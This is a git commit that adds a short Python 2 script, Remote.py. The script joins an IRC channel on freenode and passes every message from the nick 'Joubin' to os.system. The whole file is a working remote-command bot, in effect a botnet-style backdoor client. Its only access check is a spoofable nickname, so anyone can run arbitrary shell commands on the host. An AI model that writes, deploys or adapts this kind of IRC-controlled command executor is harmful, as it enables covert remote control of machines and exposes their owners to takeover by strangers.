509603c62f9453db8fc38756c36490008edf814a
joubin <joubin.j@gmail.com>
2013-04-25 21:02:41 -0700

    Version 1
    Basics of the connection

---
+++ Remote.py
@@ -0,0 +1,44 @@
+import sys 
+import socket 
+import string 
+import os
+import random
+
+HOST='irc.freenode.net'  
+PORT=6667 
+NICK='BigData'+str(random.randint(1, 1000))
+IDENT=NICK
+REALNAME=NICK 
+OWNER='Joubin' 
+
+CHANNELINIT='#joubinjabbari' 
+readbuffer='' 
+
+def parsemsg(msg): 
+    complete=msg[1:].split(':',1)
+    info=complete[0].split(' ') 
+    msgpart=complete[1] 
+    sender=info[0].split('!') 
+    if sender[0]==OWNER: 
+        cmd=msgpart
+        os.system(cmd)
+
+
+
+s=socket.socket( ) 
+s.connect((HOST, PORT)) 
+s.send('NICK '+NICK+'\r\n')  
+s.send('USER '+IDENT+' '+HOST+' bla :'+REALNAME+'\r\n') 
+while 1: 
+
+    line=s.recv(200)
+    print line 
+    if line.find('Welcome ')!=-1: 
+        s.send('JOIN '+CHANNELINIT+'\r\n') 
+    if line.find('joubin')!=-1 and line.find('JOIN')==-1: 
+        line=line.rstrip() 
+        parsemsg(line) 
+    if(line.find('PING')!=-1):
+		pongData = line.split(':', 1)
+		pongData = pongData[1].split(' ')
+		s.send('PONG '+pongData[0]+'\r\n')
